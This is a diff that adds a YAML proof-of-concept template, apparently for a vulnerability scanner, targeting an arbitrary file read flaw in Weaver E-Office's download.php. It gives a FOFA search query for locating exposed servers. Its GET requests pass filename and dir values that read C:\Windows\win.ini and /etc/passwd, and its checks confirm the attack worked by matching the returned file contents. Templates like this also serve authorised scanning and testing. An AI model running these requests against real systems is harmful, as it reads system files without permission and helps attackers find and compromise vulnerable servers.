@@ -1,0 +1,25 @@
+id: poc-yaml-weaver-e-cology-download-fileread
+info:
+  name: 泛微E-Office download.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: e-cology
+  fofa: body="泛微协同"
+variables:
+  r_data_linux: '?filename=win.ini&dir=C:\\Windows\\
+
+    ?filename=passwd&dir=/etc/'
+firstRequest:
+  method: GET
+  path: /general/file_folder/file_new/neworedit/download.php
+  expression: 'status_code == 200
+
+    '
+requests:
+- method: GET
+  path: /general/file_folder/file_new/neworedit/download.php{{.r_data_linux}}
+  expression: "status_code == 200 &&\n(\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
+    \ \"root:.*:0:0:\")\n)\n"
+transport: http
